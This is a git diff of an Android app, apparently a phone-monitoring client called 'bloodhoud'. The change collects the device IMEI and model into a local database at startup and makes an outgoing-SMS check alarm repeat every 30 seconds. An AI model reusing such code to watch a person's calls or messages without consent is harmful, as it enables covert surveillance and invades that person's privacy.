@@ -1,7 +1,10 @@
-package it.cf.bloodhoud.client.android;
+package it.cf.bloodhoud.client.android.receiver;
 
 
 import it.cf.bloodhoud.client.android.activity.AccessCallSmsListenerActivity;
+import it.cf.bloodhoud.client.android.model.Phone;
+import it.cf.bloodhoud.client.android.model.Utils;
+import it.cf.bloodhoud.client.android.serviceApp.RepositoryLocalSQLLite;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -13,6 +16,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.os.Build;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 public class InitApp
@@ -27,8 +32,10 @@ public class InitApp
 
 		// costante che indica l'azione alarm che verra notificata ai receiver per gestire il check degli outgoing sms
 		private static final String CHECK_OUTGOING_SMS = "it.cf.android.smsListener.CHECK_OUTGOING_SMS";
+		private static final long EXEC_INTERVAL = 30 * 1000;
 
 		private static final String TAG = "InitApp";
+		
 
 		//@formatter:off
 		//file di configurazione di Logback
@@ -85,13 +92,15 @@ public class InitApp
 								configureDefaultPassword(context, intent);
 								LOG.info("Default password configuration Completed");
 								Log.i(TAG, "Default password configuration Completed");
-
-								// configureLogging(context, intent);
-								// Log.i(TAG, "Logback config Completed");
-								configureAlarmManagerForCheckOutgoingSms(context, intent);
-								// Log.i(TAG, "AlarmManager For Check Outgoing Sms config Completed");
-								LOG.info("AlarmManager For Check Outgoing Sms config Completed");
-								Log.i(TAG, "AlarmManager For Check Outgoing Sms config Completed");
+								
+								
+								RepositoryLocalSQLLite repoDb = new RepositoryLocalSQLLite(context);
+								String deviceModel = getDeviceName();
+								String deviceId = getDeviceId(context);
+								Phone phone = new Phone(deviceId, deviceModel);
+								repoDb.writePhone(phone);
+								LOG.info("Phone {}", phone.toString());
+								Log.i(TAG, "Phone : " + phone.toString());
 							}
 					}
 				catch (final Exception e)
@@ -137,19 +146,39 @@ public class InitApp
 
 				final PendingIntent outgoingSmsLogger = PendingIntent.getBroadcast(context, 0, new Intent(CHECK_OUTGOING_SMS), 0);
 				final AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
-				am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 120000L, 60000L, outgoingSmsLogger);
+				am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + EXEC_INTERVAL, EXEC_INTERVAL, outgoingSmsLogger);
 			}
 
 		private void storeTimestampLastCheck(final Context context)
 			{
 				final long currentTime = System.currentTimeMillis();
 				final Editor editor = context.getSharedPreferences(InitApp.APP_FILE_PREFERENCES, Context.MODE_PRIVATE).edit();
-				editor.putLong(OutgoingSmsListener.APP_PROP_NAME_TIMESTAMP_LASTCHECK, currentTime);
+				editor.putLong(OutgoingSmsReceiver.APP_PROP_NAME_TIMESTAMP_LASTCHECK, currentTime);
 				editor.commit();
 
 				// Log.d(TAG, "Update timestamp last check: " + currentTime + " = " + Utils.formatDatetime(currentTime));
 				LOG.debug("Update timestamp last check: {}  = {}", currentTime, Utils.formatDatetime(currentTime));
 			}
+		
+		
+		public String getDeviceName() {
+			  String manufacturer = Build.MANUFACTURER;
+			  String model = Build.MODEL;
+			  if (model.startsWith(manufacturer)) {
+			    return model;
+			  } else {
+			    return manufacturer + " " + model;
+			  }
+			} 
+		
+		
+		
+		public String getDeviceId(Context context){
+			TelephonyManager telephonyManager = null;
+			telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE );
+			String deviceId = telephonyManager.getDeviceId();
+			return deviceId;
+		}
 
 		// private void configureLogging(final Context context, final Intent intent) throws Exception
 		// {
